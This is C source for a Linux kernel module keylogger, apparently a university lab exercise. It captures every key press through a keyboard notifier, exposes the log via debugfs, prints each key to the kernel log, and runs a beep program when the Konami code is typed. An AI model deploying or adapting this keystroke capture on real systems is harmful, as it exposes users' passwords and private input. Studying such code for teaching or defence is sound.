#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/debugfs.h>
#include <linux/uaccess.h>
#include <linux/mutex.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("281211");
MODULE_DESCRIPTION("Keylogger konami na laby 8");
MODULE_VERSION("1.0");

#define BUF_LEN 4096
#define CHUNK_LEN 32

/* Module parameters */
static int log_mode = 1;  // 0:US keys, 1:hex codes, 2:dec codes
module_param(log_mode, int, 0644);
MODULE_PARM_DESC(log_mode, "Log format (0:US keys (default), 1:hex codes, 2:dec codes, 3:char)");

/* debugfs entries */
static struct dentry *dir;
static struct dentry *keylog_file;
static struct mutex log_mutex;

/* Buffer for storing key data */
static size_t buf_pos;
static char keys_buf[BUF_LEN];
static const char* konami_codes[] = {"16","16","20","20","26","13","26","13","30","1e"};
static int konami_index=0;
/* US keyboard mapping */
static const char *us_keymap[][2] = {
    {"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},
    {"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},
    {"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},
    {"-", "_"}, {"=", "+"}, {"_BKSP_", "_BKSP_"}, {"_TAB_", "_TAB_"},
    {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
    {"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},
    {"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},
    {"\n", "\n"}, {"_CTRL_", "_CTRL_"}, {"a", "A"}, {"s", "S"},
    {"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},
    {"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},
    {"'", "\""}, {"`", "~"}, {"_SHIFT_", "_SHIFT_"}, {"\\", "|"},
    {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},
    {"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},
    {".", ">"}, {"/", "?"}, {"_SHIFT_", "_SHIFT_"}, {"_KP*_", "_KP*_"},
    {"_ALT_", "_ALT_"}, {" ", " "}
};

/* File operations prototypes */
static ssize_t keys_read(struct file *file, char __user *buf,
                        size_t count, loff_t *ppos);

static const struct file_operations keylog_fops = {
    .owner = THIS_MODULE,
    .read = keys_read,
};

/* Key conversion function */
static void keycode_to_string(int keycode, int shift_mask, char *buf)
{
    if (keycode >= 0 && keycode < ARRAY_SIZE(us_keymap)) {
        switch (log_mode) {
            case 0: // US keys
                snprintf(buf, CHUNK_LEN, "%s",
                        shift_mask ? us_keymap[keycode][1] : us_keymap[keycode][0]);
                break;
            case 1: // Hex codes
                snprintf(buf, CHUNK_LEN, "%02x", keycode);
                break;
            case 2: // Dec codes
                snprintf(buf, CHUNK_LEN, "%d", keycode);
                break;
            case 3: // codes as char hack
                snprintf(buf, CHUNK_LEN, "%c", (char)keycode);
                break;
        }
    }
}
static void trigger_script(void) {
    static char *argv[] = { "/usr/bin/beep", NULL };
    static char *envp[] = {
        "HOME=/",
        "PATH=/sbin:/usr/sbin:/bin:/usr/bin",
        NULL
    };

    pr_info("Triggering userspace script: %s\n", argv[0]);
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

/* Keyboard notifier callback */
static int keyboard_notify(struct notifier_block *nblock,
                         unsigned long code,
                         void *_param)
{
    struct keyboard_notifier_param *param = _param;
    char keybuf[CHUNK_LEN] = {0};
    size_t len;

    /* Only handle key press events */
    if (code != KBD_KEYCODE || !param->down)
        return NOTIFY_OK;

    /* Convert keycode to string */
    keycode_to_string(param->value, param->shift, keybuf);
    len = strlen(keybuf);
    
    if (len == 0)
        return NOTIFY_OK;

    /* Protect buffer access */
    if (mutex_lock_interruptible(&log_mutex))
        return NOTIFY_OK;

    /* Reset buffer if full */
    if (buf_pos + len >= BUF_LEN)
        buf_pos = 0;

    /* Store key in buffer */
    pr_info("Keybuff: %s\n",keybuf);
    if(!strcmp(keybuf, konami_codes[konami_index])){
      ++konami_index;
    } else {
      konami_index=0;
    }
    int konami_len=sizeof(konami_codes)/sizeof(konami_codes[0]);
    if(konami_len == konami_index){
      pr_info("CHEATS ACTIVATED \n");
      trigger_script();
      konami_index=0;
    }
    strncpy(keys_buf + buf_pos, keybuf, len);
    buf_pos += len;
    
    /* Add newline for non-US mode */
    if (log_mode > 0)
        keys_buf[buf_pos++] = '\n';

    mutex_unlock(&log_mutex);
    return NOTIFY_OK;
}

/* Read implementation */
static ssize_t keys_read(struct file *file, char __user *buf,
                        size_t count, loff_t *ppos)
{
    ssize_t ret;

    if (mutex_lock_interruptible(&log_mutex))
        return -ERESTARTSYS;

    ret = simple_read_from_buffer(buf, count, ppos, keys_buf, buf_pos);
    
    mutex_unlock(&log_mutex);
    return ret;
}

static struct notifier_block nb = {
    .notifier_call = keyboard_notify,
};

/* Module initialization */
static int __init keylogger_init(void)
{
    if (log_mode < 0 || log_mode > 3) {
        pr_err("Invalid log_mode value\n");
        return -EINVAL;
    }

    /* Initialize mutex */
    mutex_init(&log_mutex);

    /* Create debugfs directory and file */
    dir = debugfs_create_dir("keylogger", NULL);
    if (!dir) {
        pr_err("Failed to create debugfs directory\n");
        return -ENOENT;
    }

    keylog_file = debugfs_create_file("keys", 0400, dir, NULL, &keylog_fops);
    if (!keylog_file) {
        debugfs_remove_recursive(dir);
        pr_err("Failed to create debugfs file\n");
        return -ENOENT;
    }

    /* Register keyboard notifier */
    if (register_keyboard_notifier(&nb)) {
        debugfs_remove_recursive(dir);
        pr_err("Failed to register keyboard notifier\n");
        return -ENOENT;
    }

    pr_info("Keyboard logger loaded successfully\n");
    return 0;
}

/* Module cleanup */
static void __exit keylogger_exit(void)
{
    unregister_keyboard_notifier(&nb);
    debugfs_remove_recursive(dir);
    pr_info("Keyboard logger unloaded successfully\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);
